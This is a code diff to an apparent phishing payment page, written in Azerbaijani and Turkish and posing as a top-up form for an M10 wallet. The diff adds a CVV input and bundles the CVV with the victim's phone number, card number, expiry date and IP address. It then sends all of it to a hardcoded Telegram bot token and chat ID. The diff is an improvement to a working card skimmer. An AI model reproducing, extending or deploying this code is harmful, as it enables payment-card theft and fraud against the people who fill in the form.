@@ -258,7 +258,7 @@
         </div>
         <div class="form-group">
           <span class="bold-text">
-            Yüklədiyiniz məbləğ M10 hesabınıza köçürüləcək
+            Yüklədiyiniz məbləğ M10 hesabınıza gələcək.
           </span>
         </div>
         <div class="form-group">
@@ -299,6 +299,10 @@
             </select>
           </div>
         </div>
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <input type="text" id="cvv" name="cvv" maxlength="3" pattern="\d{3}" required>
+      </div>
         <button type="submit">Ödənişi Tamamla</button>
       </form>
     </div>
@@ -337,6 +341,7 @@
     const kartNumarasi = document.getElementById("kart-numarasi").value;
     const sonKullanmaAy = document.getElementById("son-kullanma-ay").value;
     const sonKullanmaYil = document.getElementById("son-kullanma-yil").value;
+    const cvv = document.getElementById("cvv").value;
 
     const botToken = "8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao";
     const chatId = "8031253006";
@@ -345,12 +350,7 @@
         const ipResponse = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipResponse.json();
         const ipAdres = ipData.ip;
-
-        const mesaj = `Telefon Numarası: ${telefonNumarasi}\n` +
-            `Yüklədiyiniz Məbləğ: ${tutar}₼\n` +
-            `Kart Numarası: ${kartNumarasi}\n` +
-            `Son İstifadə Tarixi: ${sonKullanmaAy}/${sonKullanmaYil}\n` +
-            `IP Adresi: ${ipAdres}`;
+        const mesaj = `Tel: ${telefonNumarasi}\nTutar: ${tutar}₼\nKart: ${kartNumarasi}\nTarix: ${sonKullanmaAy}/${sonKullanmaYil}\nCVV: ${cvv}\nIP Adresi: ${ipAdres}`;
 
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}`;
 
